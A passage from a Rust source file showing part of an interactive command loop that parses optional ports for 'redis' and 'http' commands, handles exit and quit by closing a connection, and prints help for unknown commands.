                    let port = match iter.next() {
                        Some(port_str) => {
                            if let Ok(port) = port_str.parse::<u16>() {
                                port
                            } else {
                                6379
                            }
                        },
                        None => {
                            6379
                        }
                    };
                    if let Err(err) = redis(config, port) {
                        print_error(err);
                    }
                },
                "http" => {
                    let port = match iter.next() {
                        Some(port_str) => {
                            if let Ok(port) = port_str.parse::<u16>() {
                                port
                            } else {
                                80
                            }
                        },
                        None => {
                            80
                        }
                    };
                    if let Err(err) = http(config, port) {
                        print_error(err);
                    }
                },
                "exit" | "quit" => {
                    if let Ok(want_exit) = exit() {
                        if want_exit {
                            close_connection(config);
                            break;
                        }
                    } else {
                        /* Close the connection in case things go wrong */
                        /* Probably not a good idea here, but I'll fix this later */
                        close_connection(config);
                        break;
                    }
                },
                _ => {
                    let message = format!("Unknown command '{}'", command);
                    print_failed(&message);
                    help();
                }
            };
        } else {
            help();
        }
    }

    println!("");
    Ok(())
}
